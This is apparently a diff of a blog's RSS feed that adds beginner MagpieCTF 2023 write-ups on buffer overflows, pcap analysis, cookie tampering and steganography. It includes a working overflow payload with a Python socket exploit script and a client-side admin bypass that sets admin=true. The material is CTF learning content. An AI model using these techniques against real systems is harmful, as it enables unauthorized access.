@@ -6,8 +6,211 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Fri, 27 Jan 2023 21:03:19 -0500</lastBuildDate>
+        <lastBuildDate>Tue, 28 Feb 2023 14:26:49 -0500</lastBuildDate>
         <atom:link href="https://shanks.dev/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>MagpieCTF 2023 - This outta be large enough right?</title>
+            <link>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/binary/this-outta-be-large-enough-right/readme/</link>
+            <pubDate>Tue, 28 Feb 2023 14:26:49 -0500</pubDate>
+            
+            <guid>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/binary/this-outta-be-large-enough-right/readme/</guid>
+            <description>We&amp;rsquo;re given a C source code file to analyze and its executable to test with.
+Solution I would like to preface this, that I have done this exact challenge from PicoCTF 2022, called buffer overflow 1 and at the time I followed along with John Hammond&amp;rsquo;s solution video. As a result, when I saw this challenge, I immediately recognized it and thus I used the solution developed by John Hammond, and simply modified it for this challenges specifics.</description>
+            <content type="html"><![CDATA[<p>We&rsquo;re given a <a href="../src/chall.c">C source code file</a> to analyze and its <a href="../src/chall">executable</a> to test with.</p>
+<h2 id="solution">Solution</h2>
+<p>I would like to preface this, that I have done this exact challenge from <a href="https://play.picoctf.org/">PicoCTF 2022</a>, called <code>buffer overflow 1</code> and at the time I followed along with <a href="https://www.youtube.com/watch?v=k4hqdVo3cqk">John Hammond&rsquo;s solution video</a>. As a result, when I saw this challenge, I immediately recognized it and thus I used the solution developed by John Hammond, and simply modified it for this challenges specifics. Nonetheless I will demonstrate the knowledge I gained at the time and share it on this writeup, but I will give credit where its due, so thanks <a href="https://www.youtube.com/@_JohnHammond">John</a>!</p>
+<p>Now on to how I retrieved the flag!</p>
+<p>First we look at the <a href="../src/chall.c">chall.c</a> file and notice immediately the <code>gets</code> function. A known vulnerable C function that is susceptible to buffer overflows. Furthermore, there&rsquo;s an uncalled <code>win</code> function which will print out the flag. Now we want to overflow the <code>gets</code> function such that we can retrieve the flag through the uncalled <code>win</code> function.</p>
+<p>How do we overflow the <code>gets</code> function? Well you need to pass in enough input until you can begin to control where you end up in memory. But we will need to know where in memory we want to go. How is this done? Using <code>readelf</code> I could find out where in memory the <code>win</code> function was loaded. Note that the <code>-s</code> is for symbols.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">readelf -s chall
+</code></pre></div><p>We see on our test machine that the win function is located in the following address: <code>0x08048486</code></p>
+<p>Now we just need to pass in enough values until we can manipulate the memory address. I achived this by passing in an obnoxious amount of <code>A</code>&rsquo;s to the program until I got a seg fault. I did this in chunks of 4 A&rsquo;s at a time. Eventually I realized that adding 12 characters to the input string originally made to be size of 56 caused a segfault.</p>
+<p>Checking with</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo dmesg
+</code></pre></div><p>We can see where the instruction pointer (ip) is pointing when it seg faults. Let&rsquo;s add 1 more character to the string, like <code>A</code> we see where we end up with the tool. Using dmesg we see that theres a seg fault at an address ending in <code>0x41</code>, which should look familiar as <code>0x41</code> is the hex value of <code>A</code>. Testing it with <code>B</code> we see it ending with <code>0x42</code>. Now we know we can manipulate the memory to get to the <code>win</code> function.</p>
+<p>Since we want to end up in <code>0x08048486</code>, we will have to understand how memory works a little more. The concept of <a href="https://en.wikipedia.org/wiki/Endianness">Endianness</a> is important here. <a href="https://youtu.be/k4hqdVo3cqk?t=1347">John does a great explanation about it here</a>. But to summarize, essentially we need to take chunks of bytes (pairs of 2 in this case) and &lsquo;invert&rsquo; it so to speak. These bytes are stored in memory using Little Endian encoding. Take a look below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">We want to change this address into Little Endian:
+0x08048486
+
+Grab the first 2 &#39;characters&#39; and put them at the end, then grab the next 2 &#39;characters&#39; and put them in the second to last place, and so on:
+0x86840408
+
+Here is how we will represent the bytes in Python:
+\x86\x84\x04\x08
+</code></pre></div><p>We check the conversion to bytes using the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x84\x04\x08&#39;)&#34;</span> | xxd
+</code></pre></div><p>Testing with the local function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#34;import sys; sys.stdout.buffer.write(b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x84\x04\x08&#39;)&#34;</span> | ./chall
+</code></pre></div><p><img src="../imgs/overflow.png" alt="overflow"></p>
+<p>Lets write up a quick Python script, <a href="../src/bin-exploit.py">here is the direct download</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+
+<span style="color:#f92672">import</span> socket <span style="color:#75715e"># dealing with internet connections</span>
+<span style="color:#f92672">import</span> argparse <span style="color:#75715e"># pass arguments when calling the script so we can use it for any other CTF challenges</span>
+<span style="color:#f92672">import</span> struct <span style="color:#75715e"># for changing the memory address into Little Endian.</span>
+
+<span style="color:#75715e"># Build out the arg parser and args to take in</span>
+parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser()
+parser<span style="color:#f92672">.</span>add_argument(
+    <span style="color:#e6db74">&#34;host&#34;</span>,
+    type<span style="color:#f92672">=</span>str,
+    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The hostname or IP address to connect to&#34;</span>
+)
+parser<span style="color:#f92672">.</span>add_argument(
+    <span style="color:#e6db74">&#34;port&#34;</span>,
+    type<span style="color:#f92672">=</span>int,
+    help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The port for the service to connect to&#34;</span>
+)
+
+args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+
+<span style="color:#75715e"># for testing</span>
+print(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
+
+<span style="color:#75715e"># Swaps the memory address to Little Endian for us</span>
+ip <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, <span style="color:#ae81ff">0x08048486</span>)
+
+<span style="color:#75715e"># 69 here represents the offset + 1</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(
+    [
+        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">69</span>,
+        ip
+    ]
+)
+<span style="color:#75715e"># Add the bytes for a newline to mimick pressing the &#34;Enter&#34; key</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+
+<span style="color:#75715e"># Takes care of closing the socket</span>
+<span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>socket() <span style="color:#66d9ef">as</span> conn:
+    conn<span style="color:#f92672">.</span>connect((args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port))
+    <span style="color:#75715e"># print(conn.recv(4096).decode(&#34;utf-8&#34;))</span>
+    conn<span style="color:#f92672">.</span>send(payload)
+    print(conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4096</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</code></pre></div><p>Running the script, we get the following response from the server:</p>
+<pre tabindex="0"><code>magpie{0mn1_fl4g_3v3rywh3r3}
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>MagpieCTF 2023 - No Password Here</title>
+            <link>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/binary/no-password-here/readme/</link>
+            <pubDate>Tue, 28 Feb 2023 13:01:17 -0500</pubDate>
+            
+            <guid>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/binary/no-password-here/readme/</guid>
+            <description>This challenge had us look at a C source code file and try to find a way to cause a buffer overflow. Here is the compiled program and its lib.
+Solution Opening the C file, we see that the file does not have the typical gets function that is well known for its vulnerabilities. Instead the function we have to focus on it scanf. If you aren&amp;rsquo;t aware, scanf does not have bound checking capability so if the input string is longer than the buffer size, then it will overflow.</description>
+            <content type="html"><![CDATA[<p>This challenge had us look at a <a href="../src/Code.c">C source code file</a> and try to find a way to cause a buffer overflow. <a href="../src/Code">Here is the compiled program</a> and its <a href="../src/lib/ld-2.27.so">lib</a>.</p>
+<h2 id="solution">Solution</h2>
+<p>Opening the C file, we see that the file does not have the typical <code>gets</code> function that is well known for its vulnerabilities. Instead the function we have to focus on it <code>scanf</code>. If you aren&rsquo;t aware, <code>scanf</code> does not have bound checking capability so if the input string is longer than the buffer size, then it will overflow.</p>
+<p>Let&rsquo;s test that out by making a quick test <code>flag.txt</code> in the same directory as the <code>Code</code> executable. Now we will pass some arbirtuary input like:</p>
+<pre tabindex="0"><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre><p>We see the output below:
+<img src="../imgs/overflow.png" alt="overflow"></p>
+<p>The flag is:</p>
+<pre tabindex="0"><code>magpie{5c4nf_n07_54f3}
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>MagpieCTF 2023 - What is Password</title>
+            <link>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/networks/what-is-password/readme/</link>
+            <pubDate>Tue, 28 Feb 2023 12:45:30 -0500</pubDate>
+            
+            <guid>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/networks/what-is-password/readme/</guid>
+            <description>This challenge had us look at a pcap file and look through the web traffic. The file can be found here.
+Solution First we open the file in Wireshark.
+Since the amount of web traffic is very small we can just analyze it manually. Notice the HTTP GET request for /Password.PNG in frame 4. After nearly 10 ACKs and PSHs, we get our server response code 200, HTTP OK in frame 15.</description>
+            <content type="html"><![CDATA[<p>This challenge had us look at a <a href="https://en.wikipedia.org/wiki/Pcap">pcap</a> file and look through the web traffic. The file can be found <a href="../src/Packet.pcapng">here</a>.</p>
+<h2 id="solution">Solution</h2>
+<p>First we open the file in <a href="https://www.wireshark.org/">Wireshark</a>.</p>
+<p>Since the amount of web traffic is very small we can just analyze it manually. Notice the <code>HTTP GET</code> request for <code>/Password.PNG</code> in frame 4. After nearly 10 ACKs and PSHs, we get our server response code 200, <code>HTTP OK</code> in frame 15. Note, alternatively you could filter through the <code>HTTP</code> protocol just to see the <code>HTTP</code> traffic.</p>
+<p>Opening frame 15 we enter the HTTP layer and expand the fields until we see the <code>Portable Network Graphics</code> field. Right click and export the packet bytes and give it a <code>name.png</code>.</p>
+<p>Opening the image we see the flag:
+<img src="../imgs/test.png" alt="flag"></p>
+<pre tabindex="0"><code>magpie{wh3r3_15_7h3_p455w0rd}
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>MagpieCTF 2023 - Chocolate Chips with Zero G</title>
+            <link>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/web/chocolate-chips-with-zero-g/</link>
+            <pubDate>Mon, 27 Feb 2023 23:36:45 -0500</pubDate>
+            
+            <guid>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/web/chocolate-chips-with-zero-g/</guid>
+            <description>This challenge had us visit our targets website, and look for an insecure admin portal.
+Solution Default websites often have a login/admin.html/php web page for admin users to login and modify certain elements. Using this information we can quickly test it, it never hurts to try right? As such we find that http://srv1.2023.magpiectf.ca:1234/admin.html exists.
+Note, you could have alternatively seen within the robots.txt that it disallows the traversal/crawling of /admin.html or you could have seen the invisible link within the nav bar.</description>
+            <content type="html"><![CDATA[<p>This challenge had us visit our targets website, and look for an insecure admin portal.</p>
+<h2 id="solution">Solution</h2>
+<p>Default websites often have a <code>login/admin.html/php</code> web page for admin users to login and modify certain elements. Using this information we can quickly test it, it never hurts to try right? As such we find that <code>http://srv1.2023.magpiectf.ca:1234/admin.html</code> exists.</p>
+<p>Note, you could have alternatively seen within the <code>robots.txt</code> that it disallows the traversal/crawling of <code>/admin.html</code> or you could have seen the invisible link within the nav bar.</p>
+<p>We navigate to the portal and try admin:admin for the credentials to see if the most basic username and password was set. Alas we have to dig deeper. Going into the browser dev tools we see that a <code>script.js</code> is run to check on the login POST form. Luckily, double clicking the script allows us to see the Javascript file so we can see how the login is validated.</p>
+<p>Notice how the only parameter tha matters is the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;submit&#39;</span>, (<span style="color:#a6e22e">e</span>) =&gt; {
+    <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">preventDefault</span>();
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#39;username&#39;</span>).<span style="color:#a6e22e">value</span>;
+    <span style="color:#66d9ef">if</span> (document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;&#39;</span>) {
+        document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin=false&#34;</span>;
+        document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`user=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+        window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;denied.html&#34;</span> <span style="color:#75715e">// Redirect
+</span><span style="color:#75715e"></span>    }
+    <span style="color:#66d9ef">else</span> {
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">admin</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">getCookie</span>(<span style="color:#e6db74">&#34;admin&#34;</span>);
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">admin</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;true&#34;</span>) {
+            window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;panel.html&#34;</span>; <span style="color:#75715e">// Redirect
+</span><span style="color:#75715e"></span>        }
+        <span style="color:#66d9ef">else</span> {
+            window.<span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;denied.html&#34;</span> <span style="color:#75715e">// Redirect
+</span><span style="color:#75715e"></span>        }
+    }
+});
+</code></pre></div><p>We can see that if we are able to modify the cookie key value pair of <code>admin=false</code> to <code>admin=true</code> then we can submit anything within the form and allowed to login. Going to the console and typing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">document.<span style="color:#a6e22e">cookie</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin=true&#34;</span>
+</code></pre></div><p>Refresh the page, and pass in random credentials and we are in!</p>
+<pre tabindex="0"><code>magpie{bu7-7h3-m1Lk-ju57-fl04T5-4W4y!}
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>MagpieCTF 2023 - So Meta</title>
+            <link>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/forensics/so-meta/readme/</link>
+            <pubDate>Mon, 27 Feb 2023 23:35:28 -0500</pubDate>
+            
+            <guid>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/forensics/so-meta/readme/</guid>
+            <description>This challenge had us look at 2 Portable Network Graphic (PNG) files that were mangled and half-destroyed. See below:
+Solution In our terminal of choice, using the following command:
+strings challenge.png We can see in the output that the challengers offered a hint: Have you heard of stegsolve? My answer: nope.
+A quick search for stegsolve leads me to this GitHub repo containing a stegsolve tool.
+We install the stegsolver tool on my virtual machine and ran the imagine combiner tool under the analyse tab to retrieve the flag:</description>
+            <content type="html"><![CDATA[<p>This challenge had us look at 2 Portable Network Graphic (PNG) files that were mangled and half-destroyed. See below:</p>
+<p><img src="../imgs/challenge.png" alt="challenge">
+<img src="../imgs/combine.png" alt="combine"></p>
+<h2 id="solution">Solution</h2>
+<p>In our terminal of choice, using the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strings challenge.png
+</code></pre></div><p>We can see in the output that the challengers offered a hint: <code>Have you heard of stegsolve?</code> My answer: nope.</p>
+<p>A quick search for <code>stegsolve</code> leads me to this <a href="https://github.com/zardus/ctf-tools/blob/master/stegsolve/install">GitHub repo containing a stegsolve tool</a>.</p>
+<p>We install the stegsolver tool on my virtual machine and ran the imagine combiner tool under the analyse tab to retrieve the flag:</p>
+<pre tabindex="0"><code>magpieCTF{H0p3fully_U_D1dnt_Brut3_f0rc3_1t}
+</code></pre>]]></content>
+        </item>
+        
+        <item>
+            <title>MagpieCTF 2023</title>
+            <link>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/readme/</link>
+            <pubDate>Sun, 26 Feb 2023 23:35:28 -0500</pubDate>
+            
+            <guid>https://shanks.dev/posts/ctf-writeups/magpiectf-2023/readme/</guid>
+            <description>Time for my second CTF! Over the weekend (Feb 24-26 2023) I participated in my second CTF competition, MagpieCTF. It is hosted by the University of Calgary Information Security Club, geared towards beginner to intermediate level players. Since my first CTF left me a little disapointed as my team didn&amp;rsquo;t cooperate as one, I chose to tackle this one alone. Oh boy did that make it much more difficult.
+As the rules prohibited players from asking third parties for solutions or methods of attack, I was left only with the power of browsing the web in research so I can learn of different methods to solve the challenges.</description>
+            <content type="html"><![CDATA[<p>Time for my second CTF! Over the weekend (Feb 24-26 2023) I participated in my second CTF competition, <a href="https://magpiectf.ca/">MagpieCTF</a>. It is hosted by the <a href="https://infosecucalgary.ca/">University of Calgary Information Security Club</a>, geared towards beginner to intermediate level players. Since my first CTF left me a little disapointed as my team didn&rsquo;t cooperate as one, I chose to tackle this one alone. Oh boy did that make it much more difficult.</p>
+<p>As the rules prohibited players from asking third parties for solutions or methods of attack, I was left only with the power of browsing the web in research so I can learn of different methods to solve the challenges. But I&rsquo;ve never been one to back down from a challenge so I steamrolled ahead.</p>
+<p>I will be posting my writeups for each challenge that I solved successfully, and noted. Unfortunately I was unable to see my final rank since I had to leave a few hours before the CTF ended but overall it was a good experience. I learned how important it is to have a team that can communicate effectively and have a variety of skillsets which would allow for an easier time with the challenges.</p>
+<p>For those interested, below is the category breakdown:</p>
+<p><img src="../imgs/category-breakdown.png" alt="breakdown"></p>
+]]></content>
+        </item>
         
         <item>
             <title>0x3 - ISSessions 2023 Standings</title>
